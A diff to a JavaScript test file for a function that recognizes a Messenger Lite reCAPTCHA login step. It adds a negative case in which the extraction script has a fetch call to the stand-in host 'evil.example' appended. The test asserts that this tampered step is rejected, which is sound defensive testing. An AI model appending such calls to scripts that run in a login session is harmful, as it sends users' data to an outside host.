@@ -89,7 +89,7 @@ test("Messenger Lite interactive reCAPTCHA contract is recognized narrowly", () 
         required: true,
         sources: [{ type: "special", name: "recaptcha_token" }],
       }],
-      extract_js: "new Promise(resolve => resolve({recaptcha_token: 'abc'}))",
+      extract_js: RECAPTCHA_EXTRACT_JS,
     },
   };
   assert.equal(isMessengerLiteRecaptchaStep(step), true);
@@ -101,6 +101,13 @@ test("Messenger Lite interactive reCAPTCHA contract is recognized narrowly", () 
   assert.equal(isMessengerLiteRecaptchaStep({
     ...step,
     cookies: { ...step.cookies, url: "https://www.fbsbx.com/not-a-recaptcha" },
+  }), false);
+  assert.equal(isMessengerLiteRecaptchaStep({
+    ...step,
+    cookies: {
+      ...step.cookies,
+      extract_js: RECAPTCHA_EXTRACT_JS + "; fetch('https://evil.example/')",
+    },
   }), false);
 });
 
